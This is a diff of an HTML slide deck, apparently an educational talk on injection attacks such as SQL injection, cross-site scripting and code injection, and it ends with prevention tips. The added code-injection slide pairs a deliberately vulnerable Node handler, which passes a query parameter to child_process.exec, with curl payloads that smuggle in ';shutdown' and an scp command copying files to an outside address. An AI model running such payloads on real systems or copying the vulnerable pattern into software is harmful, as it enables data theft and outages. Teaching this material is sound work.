@@ -79,7 +79,7 @@ Vue.directive("highlightjs", {
     </li>
     <li class="fragment">
       Considered as oldest and most dangerous attacks as this can lead to data
-      theft, data loss & complete system compromise
+      theft, data loss & full system compromise
     </li>
   </ul>
   <div class="diagram-illustration">
@@ -141,14 +141,7 @@ Vue.directive("highlightjs", {
   <ul>
     <li>SQL Injection</li>
     <li>Cross-Site Scripting</li>
-    <li>OS Command Injection</li>
     <li>Code Injection</li>
-    <!-- <li>XPath Injection</li>
-    <li>Template Injection</li>
-    <li>CRLF Injection</li>
-    <li>Email Header Injection</li>
-    <li>Host Header Injection</li>
-    <li>LDAP Injection</li> -->
   </ul>
 </section>
 
@@ -295,7 +288,7 @@ WHERE username = '${this.username}' AND password = '${btoa(this.password)}'
     <h2>Demo</h2>
     <div style="position: relative; padding-bottom: 56.25%; height: 0">
       <iframe
-        src="https://fluvid.com/videos/detail/5AZ3jhDweaSVDxkjd/embed"
+        src="https://fluvid.com/videos/detail/-KZdLIzzGEIE-AkVj/embed"
         frameborder="0"
         webkitallowfullscreen
         mozallowfullscreen
@@ -304,57 +297,26 @@ WHERE username = '${this.username}' AND password = '${btoa(this.password)}'
       ></iframe>
     </div>
   </section>
-  <section>
-    <h2>Prevention</h2>
-    <ul>
-      <li>Don’t trust any User-Supplied Input</li>
-      <li>Usage of Prepared Statements</li>
-      <li>Stop writing dynamic queries</li>
-    </ul>
-  </section>
 </section>
 
 
 <section>
   <h2>Cross-Site Scripting</h2>
-  <ul>
+  <ul style="font-size: 0.8em">
     <li>
-      Attacker inject javascript into an application to
-      <b>fool a user to get data</b>
-      from them
+      attacker attaches code onto a legitimate website that will execute when
+      the victim loads the website
     </li>
     <li>
-      One estimate is that <b>94% of web applications</b> are vulnerable to XSS
-    </li>
-  </ul>
-  <div class="diagram-illustration">
-    <img
-      class="r-stretch"
-      style="width: 60%"
-      src="https://blog.sqreen.com/wp-content/uploads/2018/03/reflexted-xss.png"
-      alt=""
-    />
-  </div>
-</section>
-
-
-<section>
-  <h2>OS Command Injection</h2>
-  <ul>
-    <li>
-      Attacker inject javascript into an application to
-      <b>fool a user to get data</b>
-      from them
-    </li>
-    <li>
-      One estimate is that <b>94% of web applications</b> are vulnerable to XSS
+      helps attacker to steal user cookies to impersonate the user & show popups
+      and Ads
     </li>
   </ul>
   <div class="diagram-illustration">
     <img
       class="r-stretch"
       style="width: 60%"
-      src="https://blog.sqreen.com/wp-content/uploads/2018/03/reflexted-xss.png"
+      src="https://www.cloudflare.com/img/learning/security/threats/cross-site-scripting/xss-attack.png"
       alt=""
     />
   </div>
@@ -365,22 +327,43 @@ WHERE username = '${this.username}' AND password = '${btoa(this.password)}'
   <h2>Code Injection</h2>
   <ul>
     <li>
-      Attacker inject javascript into an application to
-      <b>fool a user to get data</b>
-      from them
-    </li>
-    <li>
-      One estimate is that <b>94% of web applications</b> are vulnerable to XSS
+      An injection vulnerability manifests when application code sends untrusted
+      user input to an interpreter as part of a command or query.
     </li>
   </ul>
-  <div class="diagram-illustration">
-    <img
-      class="r-stretch"
-      style="width: 60%"
-      src="https://blog.sqreen.com/wp-content/uploads/2018/03/reflexted-xss.png"
-      alt=""
-    />
+  <div style="font-size: 0.6em; display: grid; grid-template-columns: 60% 40%">
+    <div>
+      <pre>
+        <code class="bash">
+curl http://www.ex.com/?file=app.js
+curl http://www.ex.com/?file=;shutdown
+curl http://www.ex.com/?file=;scp%20-r%20.%20root@315.32.2.1:/home
+        </code>
+      </pre>
+    </div>
+    <pre>
+      <code class="js" data-trim contenteditable>
+...
+app.get('/', async (req, res) {
+  await child_process.exec(
+    'gzip ' + req.query.file);
+})
+...
+      </code>
+    </pre>
   </div>
+</section>
+
+
+<section>
+  <h2>Prevention</h2>
+  <ul>
+    <li>Don’t trust any User-Supplied Input</li>
+    <li>Input Validation/Sanitization</li>
+    <li>Parametrized queries</li>
+    <li>Web application firewall</li>
+    <li>Regular scanning of application with web vulnerability scanner</li>
+  </ul>
 </section>
 
 
